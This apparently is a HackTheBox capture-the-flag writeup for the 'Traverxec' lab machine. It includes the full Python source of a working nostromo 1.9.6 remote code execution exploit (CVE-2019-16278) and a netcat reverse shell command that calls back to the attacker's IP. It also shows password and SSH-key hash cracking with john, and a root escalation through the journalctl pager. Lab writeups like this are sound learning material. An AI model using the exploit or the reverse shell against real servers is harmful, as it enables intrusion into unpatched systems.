---
date: 2020-05-24 07:12:05
layout: post
title: "Traverxec"
subtitle: 
description: Easy box from Hackthebox
image: /writeup/assets/img/traverxec/traverxec.png
optimized_image:
category: hackthebox
tags: hackthebox easy
author: cirius
paginate: false
---
Starting with the nmap scan
```bash
nmap -T4 -p- -A 10.10.10.165
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are open i.e 22 and 80.
So my first and most probably only target in port 80.
Visiting the website hosted at port 80 . I found a simple website.

Direcory Busting also does not gives much fruitful responses.
```bash
ffuf -w wordlist -u http://10.10.10.165

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.165/FUZZ
 :: Extensions       : .php .html .txt .js 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

css                     [Status: 301, Size: 314, Words: 19, Lines: 14]
js                      [Status: 301, Size: 314, Words: 19, Lines: 14]
img                     [Status: 301, Size: 314, Words: 19, Lines: 14]
lib                     [Status: 301, Size: 314, Words: 19, Lines: 14]
index.html              [Status: 200, Size: 15674, Words: 3910, Lines: 401]
```

One thing that I had noticed was that the webserver is kinda unique as it not apache or nginx but nostromo.
Checking for the exploits for the webserver. I found a exploit with CVE-2019-16278.
```bash
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278


#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    



"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)
    
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)
   
    except IndexError:
        print(help_menu)
```

Using this exploit, I got a remote code execution
![placeholder](/writeup/assets/img/traverxec/rce.png "rce")
Used the exploit to get a reverse shell on the machine.
```bash
python exp.py 10.10.10.165 80 "nc -e /bin/sh 10.10.14.29 8888"
```

To get a better shell out of the nc reverse shell.
Type these commands on the reverse shell.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
#Then
export TERM=xterm
#Then press ctrl+z
#type
stty raw -echo
#then
fg
#then press Enter two times.
#This makes shell with most functions as ssh shell.
```
Enumerating the machine for potential priv esc vectors I reached to nhttpd.conf inside /var/nostromo/conf.
The .htpasswd file inside this directory contained creds
```text
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
Cracked the hash with john
```bash
root@cirius ~/tmp# john --wordlist=/root/Documents/Passwords/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:15 23.93% (ETA: 13:26:26) 0g/s 237113p/s 237113c/s 237113C/s sophy06..sophieden
Nowonly4me       (david)
1g 0:00:00:47 DONE (2020-05-24 13:26) 0.02088g/s 220936p/s 220936c/s 220936C/s NuiMeanPoon..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Now I have creds
***david:Nowonly4me***

The conf file allowed a directory named "public_www" inside home directory of users of the machine to be accessible on the website. Look the **#HOMEDIRS** section of conf file.
```conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home                              
homedirs_public         public_www
```


Checking for the users in home directory.I found a single user **david**.

Accessing the directory public_www indide home directory of david user on website
```url
http://10.10.10.165/~david/
```
I reached this page
![placeholder](/writeup/assets/img/traverxec/david.png "david")

I tried to access the home directory of david  through the reverse shell, but I didn't had enough permission.

Then I thought maybe the public_www directory inside david's directory may be accessible; and yes it was.
![placeholder](/writeup/assets/img/traverxec/hidden.png "hidden")

There was a directory named protected_file_area, inside which there was a backup os ssh key.
Requesting the protected-file-area directory through website needed creds, I used the creds I got earlier.

Downladed the backup-ssh-identity-files.tgz from the server.

Extracting the tgz file found Private key of david user inside it.

To get the passphrase of private key , I again used john
```bash
./ssh2john.py id_rsa > hash
#This created a hash of private key which would work with john
john --wordlist=rockyou.txt hash
```

Got the passphrase for the ssh private key which came to be **hunter**.

Got the user.txt

Now again looking for priv esc vectors.

sudo -l 

This asked for david's password , which i don't know.

There is a folder inside home directory of david named bin. Moving into it i found a server-stats.sh file which was executable me david user.
The sh file contained a command which was getting executed with sudo privileges.

So maybe I can run that command with sudo privileges. I thought maybe there is an entry for david user to run that command in sudoers file.
```bash
#server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

So, I tried to run this command manually.
```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
```
It worked.

Looked GTFObins for any priv esc vector with journalctl.

I came to know that journalctl invokes **less** pager.

The way to gain root shell with this method is kinda weird.

Made the size of shell to be less than what the above command needed to show full output.

Ran the above journalctl command and then typed !/bin/sh

This gave the root shell.

This code execution happens because

**Many commands use less or more to show the result but if the terminal size is not enough then a pager is spawned beacause less and more are pager programs. 
 A pager can accept commands if the commands are prepended with !**
 
 Got the root.txt
 



